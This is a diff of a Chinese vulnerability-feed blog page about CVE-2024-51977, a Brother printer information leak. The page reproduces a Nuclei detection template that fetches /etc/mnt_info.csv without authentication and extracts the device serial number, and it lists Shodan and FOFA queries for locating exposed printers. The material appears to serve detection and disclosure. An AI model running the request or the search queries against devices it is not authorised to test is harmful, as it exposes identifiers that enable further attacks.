@@ -19,15 +19,15 @@
   <meta name="author" content="lianccc">
   <meta name="keywords" content="">
   
-    <meta name="description" content="漏洞信息漏洞名称： Brother 信息泄露漏洞 漏洞编号：  CVE： CVE-2024-51977  漏洞类型： 信息泄露 漏洞等级： 高危 漏洞描述： 未经认证的攻击者可以访问HTTP服务（TCP端口80）、HTTPS服务（TCP端口443）或IPP服务（TCP端口631），从而从易受攻击的设备中泄露多段敏感信息。通过GET请求访问URI路径&#x2F;etc&#x2F;mnt_info.c">
+    <meta name="description" content="漏洞信息漏洞名称： Brother 信息泄露漏洞 漏洞编号：  CVE： CVE-2024-51977  漏洞类型： 信息泄露 漏洞等级： 高危 漏洞描述： 未经认证的攻击者可以访问HTTP服务（TCP端口80）、HTTPS服务（TCP端口443）或IPP服务（TCP端口631），从易受攻击的设备中泄露多段敏感信息。通过GET请求可以访问URI路径&#x2F;etc&#x2F;mnt_info.c">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Brother 信息泄露漏洞">
 <meta property="og:url" content="http://example.com/2025/06/28/github_1283017263/index.html">
 <meta property="og:site_name" content="liancc&#39; infos blog">
-<meta property="og:description" content="漏洞信息漏洞名称： Brother 信息泄露漏洞 漏洞编号：  CVE： CVE-2024-51977  漏洞类型： 信息泄露 漏洞等级： 高危 漏洞描述： 未经认证的攻击者可以访问HTTP服务（TCP端口80）、HTTPS服务（TCP端口443）或IPP服务（TCP端口631），从而从易受攻击的设备中泄露多段敏感信息。通过GET请求访问URI路径&#x2F;etc&#x2F;mnt_info.c">
+<meta property="og:description" content="漏洞信息漏洞名称： Brother 信息泄露漏洞 漏洞编号：  CVE： CVE-2024-51977  漏洞类型： 信息泄露 漏洞等级： 高危 漏洞描述： 未经认证的攻击者可以访问HTTP服务（TCP端口80）、HTTPS服务（TCP端口443）或IPP服务（TCP端口631），从易受攻击的设备中泄露多段敏感信息。通过GET请求可以访问URI路径&#x2F;etc&#x2F;mnt_info.c">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2025-06-28T00:45:31.179Z">
-<meta property="article:modified_time" content="2025-06-28T00:45:31.179Z">
+<meta property="article:published_time" content="2025-06-28T03:00:25.638Z">
+<meta property="article:modified_time" content="2025-06-28T03:00:25.635Z">
 <meta property="article:author" content="lianccc">
 <meta property="article:tag" content="projectdiscovery&#x2F;nuclei-templates:github issues">
 <meta property="article:tag" content="信息泄露">
@@ -213,7 +213,7 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2025-06-28 00:45" pubdate>
+        <time datetime="2025-06-28 03:00" pubdate>
           2025年6月28日 凌晨
         </time>
       </span>
@@ -225,7 +225,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          373 字
+          374 字
         
       </span>
     
@@ -285,10 +285,10 @@
 </ul>
 <p><strong>漏洞类型：</strong> 信息泄露</p>
 <p><strong>漏洞等级：</strong> 高危</p>
-<p><strong>漏洞描述：</strong> 未经认证的攻击者可以访问HTTP服务（TCP端口80）、HTTPS服务（TCP端口443）或IPP服务（TCP端口631），从而从易受攻击的设备中泄露多段敏感信息。通过GET请求访问URI路径&#x2F;etc&#x2F;mnt_info.csv，无需认证。返回的结果是一个逗号分隔值（CSV）信息表。泄露的信息包括设备的型号、固件版本、IP地址和序列号。</p>
+<p><strong>漏洞描述：</strong> 未经认证的攻击者可以访问HTTP服务（TCP端口80）、HTTPS服务（TCP端口443）或IPP服务（TCP端口631），从易受攻击的设备中泄露多段敏感信息。通过GET请求可以访问URI路径&#x2F;etc&#x2F;mnt_info.csv，且无需认证。返回的结果是一个逗号分隔值（CSV）信息表。泄露的信息包括设备的型号、固件版本、IP地址和序列号。</p>
 <p><strong>产品厂商：</strong> Brother</p>
-<p><strong>产品名称：</strong> Brother Devices</p>
-<p><strong>搜索语法：</strong> title:”Brother” OR html:”&#x2F;common&#x2F;js&#x2F;lcddisplay.js” OR location:”&#x2F;general&#x2F;status.html” OR title:”DocuPrint”</p>
+<p><strong>产品名称：</strong> Brother Printer</p>
+<p><strong>搜索语法：</strong> title:”Brother” html:”&#x2F;common&#x2F;js&#x2F;lcddisplay.js” location:”&#x2F;general&#x2F;status.html” title:”DocuPrint”</p>
 <p><strong>来源：</strong> <a target="_blank" rel="noopener" href="https://github.com/projectdiscovery/nuclei-templates/blob/983cce67fe5ba45b4a3f26dcf0fcad69d2a388b5/http%2Fcves%2F2024%2FCVE-2024-51977.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/983cce67fe5ba45b4a3f26dcf0fcad69d2a388b5/http%2Fcves%2F2024%2FCVE-2024-51977.yaml</a></p>
 <p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p>
 <h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> CVE-<span class="hljs-number">202</span>4-<span class="hljs-number">51977</span><br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> BrotherVulnerabilities <span class="hljs-operator">-</span> Information Disclosure<br>  <span class="hljs-params">severity:</span> high<br>  <span class="hljs-params">author:</span> darses<br>  <span class="hljs-params">description:</span> |<br>    An unauthenticated attacker who can access either the HTTP service (TCP port <span class="hljs-number">80</span>), the HTTPS service (TCP port <span class="hljs-number">443</span>), <span class="hljs-keyword">or</span> the IPP service (TCP port <span class="hljs-number">631</span>), can leak several pieces of sensitive information from a vulnerable device. The URI path <span class="hljs-symbol">/etc/mnt_info.csv</span> can be accessed via a GET request and no authentication is required. The returned result is a comma separated value (CSV) table of information. The leaked information includes the device’s model, firmware version, IP address, and serial number.<br>  <span class="hljs-params">metadata:</span><br>    <span class="hljs-params">shodan-query:</span><br>      <span class="hljs-operator">-</span> title:<span class="hljs-string">&quot;Brother&quot;</span><br>      <span class="hljs-operator">-</span> html:<span class="hljs-string">&quot;/common/js/lcddisplay.js&quot;</span><br>      <span class="hljs-operator">-</span> location:<span class="hljs-string">&quot;/general/status.html&quot;</span><br>      <span class="hljs-operator">-</span> title:<span class="hljs-string">&quot;DocuPrint&quot;</span><br>    <span class="hljs-params">fofa-query:</span><br>      <span class="hljs-operator">-</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;Brother&quot;</span><br>      <span class="hljs-operator">-</span> body<span class="hljs-operator">=</span><span class="hljs-string">&quot;/common/js/lcddisplay.js&quot;</span><br>      <span class="hljs-operator">-</span> body<span class="hljs-operator">=</span><span class="hljs-string">&quot;/general/status.html&quot;</span><br>      <span class="hljs-operator">-</span> title<span class="hljs-operator">=</span><span class="hljs-string">&quot;DocuPrint&quot;</span><br>    <span class="hljs-params">reference:</span><br>      <span class="hljs-operator">-</span> https:<span class="hljs-operator">//</span>www.rapid7.com<span class="hljs-operator">/</span>blog<span class="hljs-operator">/</span>post<span class="hljs-operator">/</span>multiple-brother-devices-multiple-vulnerabilities-fixed<span class="hljs-symbol">/</span><br>      <span class="hljs-operator">-</span> https:<span class="hljs-operator">//</span>www.cve.org<span class="hljs-operator">/</span>CVERecord<span class="hljs-operator">?</span>id<span class="hljs-operator">=</span>CVE-<span class="hljs-number">202</span>4-<span class="hljs-number">51977</span><br>  <span class="hljs-params">tags:</span> detect,cve,cve2024,brother,printer<br><br><span class="hljs-params">http:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">method:</span> GET<br>    <span class="hljs-params">path:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-string">&quot;&#123;&#123;BaseURL&#125;&#125;/etc/mnt_info.csv&quot;</span><br><br>    <span class="hljs-params">matchers-condition:</span> and<br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> status<br>        <span class="hljs-params">status:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-number">200</span><br><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">part:</span> header<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;Content-Type: text/comma-separated-values&quot;</span><br><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;Serial No.&quot;</span><br><br>    <span class="hljs-params">extractors:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> regex<br>        <span class="hljs-params">name:</span> serial<br>        <span class="hljs-params">group:</span> <span class="hljs-number">6</span><br>        <span class="hljs-params">regex:</span><br>          <span class="hljs-operator">-</span> &#x27;\n<span class="hljs-string">&quot;([<span class="hljs-char escape_">\w</span><span class="hljs-char escape_">\s</span><span class="hljs-char escape_">\d</span>]+)&quot;</span>,<span class="hljs-string">&quot;([<span class="hljs-char escape_">\w</span><span class="hljs-char escape_">\s</span><span class="hljs-char escape_">\-</span>]+)&quot;</span>,<span class="hljs-string">&quot;([^&quot;</span>]<span class="hljs-operator">*</span>)<span class="hljs-string">&quot;,&quot;</span>([^<span class="hljs-string">&quot;]*)&quot;</span>,<span class="hljs-string">&quot;([<span class="hljs-char escape_">\d</span><span class="hljs-char escape_">\.</span><span class="hljs-char escape_">\:</span>]*)&quot;</span>,<span class="hljs-string">&quot;([<span class="hljs-char escape_">\d</span><span class="hljs-char escape_">\w</span>]+)&quot;</span>&#x27;<br><br></code></pre></td></tr></table></figure>
@@ -385,18 +385,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2025/06/28/github_1408488851/" title="Microsoft NET Framework 远程代码执行漏洞">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">Microsoft NET Framework 远程代码执行漏洞</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2025/06/28/github_2169153056/" title="FasterXML Jackson Databind 反序列化远程代码执行漏洞">
-                        <span class="hidden-mobile">FasterXML Jackson Databind 反序列化远程代码执行漏洞</span>
+                      <a href="/2025/06/28/github_892215291/" title="Brother Printers 默认管理员密码认证绕过漏洞">
+                        <span class="hidden-mobile">Brother Printers 默认管理员密码认证绕过漏洞</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
